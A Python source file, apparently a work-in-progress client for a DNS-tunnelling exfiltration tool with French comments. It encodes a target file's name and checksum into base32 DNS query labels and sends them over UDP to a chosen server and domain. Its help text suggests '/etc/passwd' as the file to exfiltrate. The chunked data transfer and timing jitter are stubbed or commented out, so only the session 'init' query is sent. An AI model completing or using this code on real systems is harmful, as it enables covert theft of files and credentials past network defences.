#!/usr/bin/env python3.12

import os
import sys
import uuid
import json
import argparse
import dnslib
import signal
import threading
import time
import random
import base64
import socket
from utils import *

from io import StringIO

MIN_TIME_SLEEP = None
MAX_TIME_SLEEP = None
MIN_BYTES_READ = None
MAX_BYTES_READ = None

class FileExfiltrator(threading.Thread):
    def __init__(self,file_to_send, args):
        threading.Thread.__init__(self)
        self.file_to_send = file_to_send
        self.domain = args.domain
        self.address, self.port = args.socket.split(':')
        self.sessionid = str(uuid.uuid4())[:8].upper()
        self.checksum = ''
        self.max_attempts = 5

        self.sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        self.sock.settimeout(2)

    def run(self):

        # Check if the file exists
        #if not os.path.exists(self.file_to_send):
            #print(f"File '{self.file_to_send}' does not exist. Aborting")
            #return

        try:
            with open(self.file_to_send, 'rb') as f:
                self.checksum = md5(f)
                # if file empty, mad5 hash is d41d8cd98f00b204e9800998ecf8427e
                #print(self.checksum)

        except FileNotFoundError:
            print(f"Error: File {self.file_to_send} not found.")
            return
        except Exception as e:
            print(f"Error: {e}")

        data = ['init',str(os.path.basename(self.file_to_send)),'1',str(self.checksum)]
        request = f"{self.sessionid}"
        for element in data:
            # Convertir la chaîne en une séquence d'octets (UTF-8 est couramment utilisé)
            binary_data = element.encode('utf-8')
            # Encoder en base32
            encoded_element = base64.b32encode(binary_data).decode('utf-8').rstrip('=')
            request += '.' + encoded_element
        request = request + '.' + str(self.domain)   
        
        #print(request)

        q = dnslib.DNSRecord.question(request)

        #q.send(self.address, int(self.port), timeout=1)
        self.sock.sendto(q.pack(), (self.address, int(self.port)))

        try:
            response, _ = self.sock.recvfrom(1024)

        except socket.timeout:
            print("Timeout: No response received within the specified timeout.")
            self.sock.close()
            sys.exit("Exiting due to timeout.")

        reply = dnslib.DNSRecord.parse(response)
        #print(f"Received DNS response: {reply}")

        # Vérifier si le domaine de la réponse est égal à la requête
        if reply.questions[0].qname == dnslib.DNSLabel(request) and reply.header.rcode != dnslib.RCODE.SERVFAIL:
            print("Le domaine de la réponse est égal à la requête.")
            # Ajoutez ici le code que vous souhaitez exécuter lorsque le domaine de la réponse est égal à la requête.
        else:
            print("Server failed")
        

        #time_to_sleep = random.uniform(MIN_TIME_SLEEP, MAX_TIME_SLEEP)
        #print(f"Sleeping for {time_to_sleep} seconds")
        #time.sleep(time_to_sleep)

        #while True:
            #print("Thread for file {} is running...".format(self.file_to_send))
            #time.sleep(1)  # Simulate a long task


def signal_handler(sig, frame):
    print("Received signal {}, exiting...".format(sig))
    sys.exit(0)

def main():
    global MIN_TIME_SLEEP, MAX_TIME_SLEEP, MIN_BYTES_READ, MAX_BYTES_READ

    parser = argparse.ArgumentParser()
    parser.add_argument('-s', '--socket', action="store", dest="socket", default=None,
                        help="The upstream server for making DNS requests and the port (eg. '-s 127.0.0.1:53')")
    parser.add_argument('-f','--file', nargs="+", dest="file",
                        help="File to exfiltrate (eg. '-f /etc/passwd')")
    parser.add_argument('-d', '--domain', action="store", dest="domain",
                        help="The domain to make requests for. (eg. '-d test.com')")
    args = parser.parse_args()


    # Afficher les valeurs des arguments
    print('Socket:', args.socket)
    print('Files:', args.file)
    print('Domains:', args.domain, '\n')

    with open('config.json') as json_file:
        config = json.load(json_file)

    MIN_TIME_SLEEP = int(config['minTimeSleep'])
    MAX_TIME_SLEEP = int(config['maxTimeSleep'])
    MIN_BYTES_READ = int(config['minBytesRead'])
    MAX_BYTES_READ = int(config['maxBytesRead'])

    signal.signal(signal.SIGINT, signal_handler)

    if (args.file is None):
        parser.print_help()
        sys.exit(-1)

    else:
        files = list(set(args.file))
        #print(files)

    threads = []
    for file_to_send in files:
        print(f"Launching thread for file {file_to_send}")
        thread = FileExfiltrator(file_to_send, args)
        threads.append(thread)
        thread.daemon = True
        thread.start()

    # Join for the threads
    for thread in threads:
        while True:
            thread.join(1)
            if not thread.is_alive():
                break

if __name__ == '__main__':
    main()